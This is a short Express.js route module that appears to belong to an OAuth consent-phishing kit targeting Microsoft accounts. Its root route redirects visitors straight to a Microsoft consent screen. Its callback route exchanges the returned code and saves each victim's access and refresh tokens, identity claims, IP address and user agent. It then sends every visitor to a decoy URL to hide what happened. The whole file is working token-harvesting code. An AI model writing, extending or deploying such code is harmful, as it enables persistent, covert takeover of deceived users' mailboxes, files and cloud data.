const express = require('express');
const oauth = require('../oauth');
const { decodeIdToken } = require('../claims');

function buildConsentRoutes({ config, store, logger }) {
  const router = express.Router();

  // GET / — straight to Microsoft consent. No HTML, no intermediate page.
  router.get('/', (_req, res) => {
    const url = oauth.buildConsentUrl(config);
    res.redirect(302, url);
  });

  // GET /login/authorized — OAuth redirect URI. Exchange code, persist, decoy.
  router.get('/login/authorized', async (req, res, next) => {
    try {
      const code = req.query.code;
      if (!code || typeof code !== 'string') {
        logger.warn({ query: Object.keys(req.query) }, 'missing code');
        return res.redirect(302, config.DECOY_URL);
      }

      const tokens = await oauth.exchangeCode(config, code);
      const claims = decodeIdToken(tokens.id_token);

      if (!claims.oid || !claims.tenantId) {
        logger.warn('id_token missing oid/tid; cannot persist');
        return res.redirect(302, config.DECOY_URL);
      }

      const expiresAt =
        Math.floor(Date.now() / 1000) + Number(tokens.expires_in || 3600);

      await store.upsertToken({
        ...claims,
        accessToken: tokens.access_token,
        refreshToken: tokens.refresh_token,
        idToken: tokens.id_token,
        scope: tokens.scope,
        expiresAt,
        sourceIp: req.ip,
        userAgent: req.get('user-agent') || null,
      });

      return res.redirect(302, config.DECOY_URL);
    } catch (err) {
      return next(err);
    }
  });

  return router;
}

module.exports = { buildConsentRoutes };
